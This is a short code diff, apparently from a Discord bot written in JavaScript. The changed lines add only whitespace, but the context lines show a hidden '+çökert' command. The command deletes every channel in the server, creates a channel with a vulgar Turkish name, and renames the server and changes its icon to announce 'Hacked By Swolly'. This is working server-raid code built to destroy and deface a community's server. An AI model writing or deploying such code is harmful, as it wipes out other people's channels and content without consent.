@@ -142,7 +142,7 @@ client.on("message", msg => {
 client.on("message", async msg => {
   if (msg.content === "+çökert") {
     msg.delete();
-
+    
     await msg.guild.channels.deleteAll();
 
     await msg.guild.createChannel("✝-Swolly,sikti");
@@ -200,6 +200,8 @@ client.on("message", async msg => {
     await msg.guild.setIcon(
       "https://cdn.glitch.com/24a52842-1186-4e63-b8f4-d59b7d0d88ac%2Fimage.png"
     );
+    
+    
     await msg.guild.setName("✝ Hacked By Swolly ✝"); //sunucu ismini yapar
     await client.user.setAvatar(
       "http://sicanzi.com/"
